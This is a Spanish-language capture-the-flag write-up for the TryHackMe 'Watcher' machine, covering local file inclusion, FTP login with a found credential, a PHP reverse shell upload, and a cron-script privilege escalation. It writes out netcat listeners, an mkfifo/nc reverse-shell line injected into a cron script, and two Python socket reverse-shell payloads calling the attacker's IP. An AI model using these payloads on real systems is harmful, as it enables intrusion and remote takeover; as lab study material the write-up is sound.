---
layout: single
title: Watcherv 1.4
excerpt: "Work your way through the machine and try to find all the flags you can!"
date: 2022-05-27
classes: wide
header:
  teaser: /assets/images/thm-writeup-watcher/watcher_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - nmap
  - couchdb
  - Web
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-watcher/watcher_logo.png)

[Link](https://tryhackme.com/room/watcher "Watcher")

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques, Work your way through the machine and try to find all the flags you can!

Made by @rushisec

---

- Flag 1 -> hint: (<https://moz.com/learn/seo/robotstxt>)

Revisando el directorio **robots.txt** encontramos una ruta, que al abrir, encontramos la la bandera correspondiente a este punto:

![flag1](/assets/images/thm-writeup-watcher/watcher_flag1.png)

---

- Flag 2 -> <https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/>

Con la segunda ruta que obtuvimos en el directorio **robots.txt** y con la pista, que nos indica que la página es vulnerable a **lfi**, procedemos con los siguientes pasos:

1.Verificamos la vulnerabilidad con **burpsuite** listando la ruta **/etc/passwd** como se oberva a continuación:

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_1.png)

2.Con está información, listamos la ruta No. 2 de **robots.txt**, obteniendo un usuario y contraseña **ftp**, como se observa en la siguiente imagen:

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_2.png)

3.Con el usuario y contraseñas que encontramos en el paso anterior, ingresamos vía **ftp**, listamos los archivos y descargamos la **flag_2.txt** como mostramos a continuación:

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_3.png)

ftpuser:givemefiles777
---

- Flag 3 -> <https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2>

1.Preparamos una **reverse-shell.php**, descargada de <https://pentestmonkey.net/tools/web-shells/php-reverse-shell> con los datos de la máquina atacante, como observamos a continuación:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_1.png)

2.Procedemos a subir nuestra reverse shell al servidor **ftp**, con el comando **put**como lo muestra la siguiente imagen:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_2.png)

3.Nos ponemos en escucha por el puerto configurado, en nuestro caso **4444** con el siguiente comando: **nc -nlvp 4444**

4.Ejecutamos la **rshell.php**, con la siguiente ruta <http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php>, desde burpsuite o desde el navegador:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_3.png)

5.Obtenemos la reverse shell y con el comando **SHELL=/bin/bash script -q /dev/null** realizamos el tratamiento de la shell.

6.Con el siguiente comando realizamos la búsqueda de la bandera 3:

~~~go
find / -type f -name flag_3.txt 2>/dev/null
~~~

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_4.png)

---

- Flag 4 -> <https://www.explainshell.com/explain?cmd=sudo+-l>

- Con el siguiente comando podemos pasar al usuario "toby"

~~~go
sudo -u toby /bin/bash
~~~

- Ya como "toby" obtenemos la bandera:

![flag4](/assets/images/thm-writeup-watcher/watcher_flag4.png)

---

- Flag 5 -> https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs

5.1 Con base en la lista procedemos a consultar los "crontab":

~~~go
cat /etc/crontab
~~~

![flag5](/assets/images/thm-writeup-watcher/watcher_flag5.png)

5.2 Observamos el script "cow.sh", el cual copia una foto entre directorios:

~~~go
toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg

~~~

5.3 Nos ponemos en escucha con **nc** en el puerto 555
  
~~~go
nc -nlvp 555
~~~

5.4 Inyectamos una reverse shell en el script "cow.sh" con el siguiente comando:

~~~go
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.68 5555 >/tmp/f" >> cow.sh
~~~

5.5 Ejecutamos el script:

~~~go
./cow.sh
~~~

5.6 Obtenemos una reverse shell como "mat" y la bandera solicitada:

~~~css
└─# nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.9.0.68] from (UNKNOWN) [10.10.107.245] 40532
sh: 0: can't access tty; job control turned off
$ whoami
mat
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mat@watcher:~$ ls
ls
cow.jpg  flag_5.txt  note.txt  scripts
cat flag_5.txt
FLAG{????????}
mat@watcher:~$ 
~~~


echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.68",555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > cmd.py

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.68",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > cmd.py